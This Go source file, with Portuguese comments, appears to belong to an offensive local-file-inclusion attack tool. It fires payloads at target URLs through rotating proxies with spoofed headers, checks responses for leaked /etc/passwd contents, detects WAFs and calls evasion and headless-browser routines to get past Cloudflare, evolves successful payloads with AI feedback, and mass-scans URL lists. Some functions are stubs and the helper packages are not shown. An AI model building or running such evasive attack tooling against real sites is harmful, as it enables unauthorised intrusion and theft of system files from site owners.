package scanner

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"lfitessla/aibridge"
	"lfitessla/analyzer"
	"lfitessla/browserexec"
	"lfitessla/entropy"
	"lfitessla/evolution"
	"lfitessla/headers"
	"lfitessla/http2mux"
	"lfitessla/proxy"
	"lfitessla/telemetry"
	"lfitessla/utlslocal"
	"lfitessla/wscontrol"
)

func init() {
	var seed int64
	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
	mathrand.Seed(seed)
}

func ExtractHos(rawurl string) string {
	return utlslocal.ExtractHost(rawurl)
}

// ScanAlvoCompleto realiza o scan completo de um alvo via WebSocket
func ScanAlvoCompleto(baseURL string) bool {
	ws, err := wscontrol.Connect("wss://control.tessla.local/scan")
	if err != nil {
		fmt.Println("Erro ao conectar ao WebSocket:", err)
		return false
	}
	defer ws.Close()

	ws.Log("start-scan", baseURL)

	fpPassive := utlslocal.PassiveFingerprint(baseURL)
	fpActive := utlslocal.ActiveFingerprint(baseURL)
	ws.Log("fingerprint", fpPassive, fpActive)

	attackID := "attack-example-id"
	ws.Log("attack-started", attackID)

	// LoadPopulation já retorna *evolution.Population
	population := evolution.LoadPopulation(baseURL)
	evolution.RecordSuccess(population, "payload-example")

	ws.Log("end-scan", baseURL)
	return true
}

// executarAtaque chama ScanAlvoCompleto e imprime o resultado
func executarAtaque(baseURL string) {
	if ScanAlvoCompleto(baseURL) {
		fmt.Println("✅ Ataque completado com sucesso!")
	} else {
		fmt.Println("❌ Falha no ataque!")
	}
}

// executarSonda dispara uma requisição e analisa resposta
func executarSonda(baseURL, payload string, clientTpl *http.Client, population *evolution.Population, ws *wscontrol.Client) {
	time.Sleep(entropy.RandDelay(100, 300))

	req, err := http.NewRequest("GET", baseURL+payload, nil)
	if err != nil {
		ws.Log("bad-request", baseURL, payload, err.Error())
		return
	}
	for k, v := range headers.GerarHeadersRealistas() {
		req.Header[k] = v
	}
	req.AddCookie(&http.Cookie{Name: "lfi", Value: payload})
	req.Header.Set("X-LFI-Scan", payload)
	req.URL.Fragment = payload

	localPayload := payload
	go func(r *http.Request, p string) {
		sec := proxy.SelecionarOutroProxy(nil)
		client, err := http2mux.ClientHTTP2ComProxy(sec.Address)
		if err != nil {
			return
		}
		if r2, e2 := client.Do(r.Clone(context.TODO())); e2 == nil {
			if analyzer.CompararRespostas(nil, r2) {
				ws.Log("cross-vantage-diff", baseURL, p)
			}
			r2.Body.Close()
		}
	}(req, localPayload)

	// medir variação de tempo
	times := make([]time.Duration, 3)
	for i := range times {
		start := time.Now()
		respTmp, _ := clientTpl.Do(req.Clone(context.TODO()))
		if respTmp != nil {
			io.Copy(io.Discard, io.LimitReader(respTmp.Body, 512))
			respTmp.Body.Close()
		}
		times[i] = time.Since(start)
		time.Sleep(time.Duration(mathrand.Intn(300)+100) * time.Millisecond)
	}
	if max, min := maxMinDuration(times); max-min > 300*time.Millisecond {
		ws.Log("time-variance", baseURL, payload)
	}

	client := withProxyClient()
	if client == nil {
		return
	}
	start := time.Now()
	resp, err := client.Do(req)
	latency := time.Since(start).Milliseconds()
	if err != nil {
		return
	}
	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	body := string(bodyBytes)

	// ─── Telemetria ─────────────────────────────────────────────────────
	snippet := ""
	if len(bodyBytes) > 200 {
		snippet = string(bodyBytes[:200])
	} else {
		snippet = string(bodyBytes)
	}
	waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
	telemetry.ProcessarDados(
		payload,
		resp.StatusCode,
		latency,
		waf,
		snippet,
		regexp.MustCompile(`root:.*:0:0:`).Match(bodyBytes), // sucesso se leak
	)
	// ───────────────────────────────────────────────────────────────────

	analisarResposta(resp, bodyBytes, baseURL, payload, ws, population)
	aibridge.EnviarFeedbackReforco(payload, resp.StatusCode, latency, waf)
}

// analisarResposta verifica padrões na resposta e registra eventos
func analisarResposta(resp *http.Response, bodyBytes []byte, baseURL, payload string, ws *wscontrol.Client, population *evolution.Population) {
	body := string(bodyBytes)

	if e := entropy.Shannon(bodyBytes); e > 4.5 {
		ws.Log("high-entropy", baseURL, payload, e)
	}
	if regexp.MustCompile(`root:.*:0:0:`).MatchString(body) {
		ws.Log("lfi-detected", baseURL, payload)
		evolution.RecordSuccess(population, payload)
	}
	if result := analyzer.ClassificarVazamento(body); result != "📄 Vazamento genérico" {
		ws.Log("vazamento", baseURL, payload, result)
	}
	if strings.Contains(body, payload) {
		ws.Log("reflected-output", baseURL, payload)
	}

	if waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body); waf != "" {
		ws.Log("waf-detected", baseURL, payload, waf)
		utlslocal.EvasaoWAFs(baseURL)
		if strings.Contains(strings.ToLower(waf), "cloudflare") {
			if br, err := browserexec.ExecutarNoBrowser(baseURL+payload, payload); err == nil && br.Success {
				ws.Log("stealth-browser-success", baseURL, payload)
				evolution.RecordSuccess(population, payload)
			}
		}
	}
}

func maxMinDuration(arr []time.Duration) (max, min time.Duration) {
	if len(arr) == 0 {
		return 0, 0
	}
	min = arr[0]
	max = arr[0]
	for _, v := range arr {
		if v > max {
			max = v
		}
		if v < min {
			min = v
		}
	}
	return
}

func withProxyClient() *http.Client {
	proxySel := proxy.SelecionarProxy()
	client, err := http2mux.ClientHTTP2ComProxy(proxySel.Address)
	if err != nil {
		proxy.MarcarFalha(proxySel)
		return nil
	}
	return client
}

func ScanListCompleto(filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("❌ Não abriu lista:", err)
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url == "" {
			continue
		}
		fmt.Println("▶️ Escaneando:", url)
		if ScanAlvoCompleto(url) {
			fmt.Println("🎯 Vulnerabilidade confirmada em", url)
		} else {
			fmt.Println("❌ Não detectado em", url)
		}
	}
}
